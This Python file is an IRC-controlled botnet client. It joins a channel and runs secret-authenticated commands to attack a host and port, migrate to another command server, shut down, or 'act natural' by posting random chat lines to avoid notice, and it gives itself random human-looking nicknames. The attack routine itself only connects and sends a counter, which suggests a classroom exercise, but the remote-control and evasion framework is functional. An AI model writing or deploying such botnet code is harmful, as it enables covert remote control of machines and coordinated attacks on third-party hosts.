import socket
import time
import threading
import random
import sys
import traceback
import time
import re

def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

class colors:
    OAKGREEN = '\033[92m'
    BLUE = '\033[1;34m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


class TimerThread(threading.Thread):
    def __init__(self, time, timeEnd, function):
        self._stopped = False
        self._time = time
        self._function = function

        #tells the timer that there is a range on the time, if this is set to none - it will
        #iterate every "time" seconds. Otherwise, it will iterate between time and timeEnd seconds
        self._timeEnd = timeEnd
        threading.Thread.__init__(self)

    def run(self):

        while not self._stopped:
            self._function()
            timeToSleep = self._time if not self._timeEnd else random.randint(self._time, self._timeEnd)
            time.sleep(timeToSleep)

    def stop(self):
        self._stopped = True
        
    
class Bot:
    def __init__(self, server, channel, port, secret):
        """ """
        self._server = server
        self._channel = "#" + channel
        self._port = port
        self._nick = ""
        self._secret = secret
        self._shutdown = False
        self._naturalTimer = None # TimerThread(5, self.actNatural) #threading.Timer(5, self.actNatural)

        self._attackcount = 0
        
        self.pickNewName()
        
        try: 
            self.connectAndRun()
        except:
            eprint(traceback.format_exc())

    def connectAndRun(self):
        """ 
        initializes a new socket and attempts to connect to the server/port combination
        """
        self._socket = socket.socket()
        
        connected = False
        while connected != True:
            try:
                eprint("!! Attempting to connect...")
                self._socket.connect((self._server, self._port))
                connected = True
                eprint("!! Connected to server {0} on port {1}".format(self._server, self._port))
            finally:
                if connected != True:
                    eprint("!! Error connecting. Trying again in 5 seconds.")
                    sys.stdout.flush()
                    time.sleep(5)
                    

        self.doWork()
    
             
            
    def parsemsg(self, s):
        """Breaks a message from an IRC server into its prefix, command, and arguments.
        """
        prefix = ''
        trailing = []
        if not s:
            raise IRCBadMessage("Empty line.")
        if s[0] == ':':
            prefix, s = s[1:].split(' ', 1)
        if s.find(' :') != -1:
            s, trailing = s.split(' :', 1)
            args = s.split()
            args.append(trailing)
        else:
            args = s.split()
            
        command = args.pop(0)
            
        return prefix, command, args

    def logSend(self, msg):
        """
        sends a given message and logs what message was sent to stdout
        """

        msg = bytes(msg)
        eprint("--> sending: {0}{1}{2}".format(colors.BLUE, msg, colors.ENDC))
        self._socket.send(msg)
        
    def logRecv(self):
        """
        receives a message and logs the message that was received to stdout.
        assumes that messages are delimited by \r\n as per irc protocol.

        If multiple messages are received, it will return an array of the commands
        
        If only one message is received, the array will be of size 1
        """
        response = self._socket.recv(1024).decode("utf-8")
        eprint("<-- received: {0}{1}{2}".format(colors.WARNING, response, colors.ENDC))
        responses = response.split("\r\n")
        return responses[:len(responses) - 1]

    def initConnection(self):
        """
        Initializes the session with the IRC server by introducing ourselves and 
        joining the specified channel.
        """
        self.logSend("NICK {}\r\n".format(self._nick).encode("utf-8"))
        self.logSend("USER {0} 0 * :{1}\r\n".format(self._nick, self._nick).encode("utf-8"))

    def debugLogResponse(self, prefix, command, args):
        """ 
        logs a single command's prefix, command, and arguments for debugging purposes. 
        """
        eprint("prefix: {0}".format(prefix))
        eprint("command: {0}".format(command))
        eprint("args: {0}".format(args))


    def doWork(self):
        """ 
        Handles the receive/response loop by introducing the bot to the server, then handles
        responses to basic commands
        """
        try:
            self.initConnection()

            responses = self.logRecv()
            while self._shutdown != True and len(responses) > 0:
                for response in responses:
                    prefix, command, args = self.parsemsg(response)
                    
                    self.debugLogResponse(prefix, command, args)
                    
                    if command == "PING":
                        self.logSend("PONG {0}\r\n".format(args[0]).encode("utf-8"))
                    elif command == "004":
                        #registration complete - join channel
                        self.logSend("JOIN {}\r\n".format(self._channel).encode("utf-8"))
                    elif command == "433":
                        #username taken
                        self.pickNewName()
                        self.initConnection()
                    elif command == "PRIVMSG":
                        sender = prefix[:prefix.index("!")]
                        channel = args[0]
                        msg = args[1]

                        eprint("message from {0}".format(sender))
                        self.parsePrivMsg(sender, msg)
                            
                    elif command == "ERROR":                        
                        eprint("!! Server sent error, could be connecting too quick, wait 10 seconds..")
                        sys.stdout.flush()
                        time.sleep(10)
                if self._shutdown != True:
                    responses = self.logRecv()

            
        except KeyboardInterrupt:
            #in case we'd like
            raise
        except:
            #other exception, continue to reconnect
            eprint("Error encountered: ")
            eprint(traceback.format_exc())
            eprint("Waiting 5 seconds before reconnect...")
            sys.stdout.flush()
            time.sleep(5)
            

        #if we haven't received the shutdown command, boot 'er back up
        if not self._shutdown:
            self.connectAndRun()
        else:
            print("{0}Received shutdown signal{1}".format(colors.FAIL, colors.ENDC))

    def parsePrivMsg(self, sender, msg):
        if msg == "heyyy what up mah glip glops?":
            response = "PRIVMSG {0} :{1}\r\n".format(sender, "what is my purpose?").encode('utf-8')
            self.logSend(response)
        else:
            msgParts = msg.split()

            #we dont support any commands less than 2. Require: "secret command [command_params]"
            if len(msgParts) < 2:
                return
            
            secret = msgParts[0]
            if secret == self._secret:
                command = msgParts[1]
                                
                print("Controller requested we run command: {0}".format(command))
                if command == "attack":
                    eprint(msgParts)
                    eprint("Recv attack command")
                    eprint(len(msgParts))
                    eprint(msgParts)
                    if len(msgParts) == 4:
                        unres_host = msgParts[2]
                        try:
                            port = int(msgParts[3])
                            if port >= 1 and port <= 65535:
                                host = self.domain_resolution(unres_host)
                                
                                self.performAttack(host, port, sender)
                            else:
                                response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack failed, invalid port").encode('utf-8')
                                self.logSend(response)
                                eprint("Ignoring attack command. Port not between 1 and 65535.")
                        except:
                            response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack failed, no such hostname").encode('utf-8')
                            self.logSend(response)
                            eprint(traceback.format_exc())
                            eprint("Something went wrong. Ignoring attack command")
                    else:
                        eprint("Ignoring attack command. Wrong formatting.")
                elif command == "move":
                    if len(msgParts) == 5:
                        server = msgParts[2]
                        channel = msgParts[4]
                        try:
                            port = int(msgParts[3])
                            if port >= 1 and port <= 65535:
                                #handle server name resolution
                                self._server = self.domain_resolution(server)
                                self._port = port
                                self._channel = '#'+channel
                                self._socket.send("QUIT\r\n".encode("utf-8"))
                            else:
                                eprint("Ignoring move command. Port not between 1 and 65535.")
                        except:
                            eprint(traceback.format_exc())
                            eprint("Ignoring move command. Port malformed.")   
                elif command == "shutdown":
                    self._shutdown = True
                elif command == "actnatural":
                    if msgParts[2] == "true":
                        eprint("Acting natural..")
                        self._naturalTimer = TimerThread(time=5, timeEnd=10, function=self.actNatural)
                        self._naturalTimer.start()
                        #self._naturalTimer.start()
                    elif msgParts[2] == "false":
                        eprint("Stopped acting natural..")
                        if self._naturalTimer:
                            self._naturalTimer.stop()
                            #self._naturalTimer.cancel()
                        else:
                            eprint("Act natural timer was not setting. Ignoring command")
                    else:
                        eprint("Ignoring command. Malformed boolean.")


    def actNatural(self):
        phrases = ["kapa kapa", "oyoyoyoyoyoy", "RUINED IT!!", "Saved it!!",
                   "Wat time is it?", "me gusta", "now THAT is funny.", "please be kind",
                   "wow im offended", "i dont care if ur offended, this is who i am",
                   "does anyone know how to get to falador?", "buying gf 248gp",
                   "ya manky chav", "WOWWWW", "how do i mute someone?", "press alt+f4",
                   "wow you guys are mean"]

        phrase = phrases[random.randint(0, len(phrases) - 1)]
        response = "PRIVMSG {0} :{1}\r\n".format(self._channel, phrase).encode('utf-8')
        self.logSend(response)
        
        

    def performAttack(self, host, port, sender):
        atksock = socket.socket()
        self._attackcount = self._attackcount+1
        try:
            atksock.connect((host,port))
            msg = "{0} {1}\n".format(self._attackcount, self._nick).encode("utf-8")
            totalsent = 0
            while totalsent < len(msg):
                sent = atksock.send(msg[totalsent:])
                if sent == 0:
                    raise RuntimeError("attack socket connection broken")
                totalsent = totalsent + sent
            atksock.close()
            response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack successful").encode('utf-8')
            self.logSend(response)
        except:
            eprint(traceback.format_exc())
            eprint("Something went wrong. Attack was unsuccessful")
            response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack failed, no such hostname").encode('utf-8')
            self.logSend(response)
            
    def pickNewName(self):
        """ 
        set a new name for the bot. Called on startup and repeatedly if name is taken.

        TODO: if we desire more than 1872 possible names, we should add some method of logging how
        many failed name attempts have been made and introduce some level of randomness at this point.

        If we do not care about the human readability of the names, a small randomized alphanumeric
        will suffice
        """
        first = ["commander", "prince", "princess", "lord", "king", "queen", "mr", "keeper", "warden", "governor", "mayor", "president", "lil", "admin"]
        middle = ["toad", "pie", "skillet", "cake", "hamster", "jock", "rage", "fun", "gander", "goose", "bug", "turkey", "pork", "squanch", "plumbus", "meander"]
        last = ["toes", "fingers", "chef", "herder", "chop", "shepherd", "buns", "pickle", "fiend", "burger", "milk", "juice", "thighs", "moose"]

        firstInd = random.randint(0, len(first) - 1)
        middleInd = random.randint(0, len(middle) - 1)
        lastInd = random.randint(0, len(last) - 1)

        #change this to a new server
        self._nick = first[firstInd] + "_" + middle[middleInd] + "_" + last[lastInd]

    def domain_resolution(self, host):
        """ 
        resolves a domain in the format xxx.xxx.xxx.xxx:xxxx[x]
        if the specified domain is an alias, a resolution is attempted
        """
        ipFormat = r"(\d{1,3}\.){3}\d{1,3}$"
        
        # if the host does not match the ip regex
        if not re.match(ipFormat, host):
            ip = socket.gethostbyname(host)
            
            if len(ip) > 0:
                print("!! {0} is ip:{1}".format(host, ip))
                host_ip = ip
            else:
                eprint("Cannot resolve IP")
        else:
            # else host is an IP
            host_ip = host    
        return host_ip


if __name__ == "__main__":
    if len(sys.argv) != 5:
        eprint("Invalid usage. Use:")
        eprint("python {0} [hostname] [port] [channel] [secret_phrase]".format(sys.argv[0]))
    else:
        try:
            server = str(sys.argv[1])
            port = int(sys.argv[2])
            channel = str(sys.argv[3])
            secret = str(sys.argv[4])

            bot = Bot(server, channel, port, secret)
        except ValueError:
            eprint("Invalid port number. Port must be from 1-65535")
        except:
            eprint("An error occurred. Please ensure valid parameters.")
        finally:
            eprint("Exitting bot...")
            
    
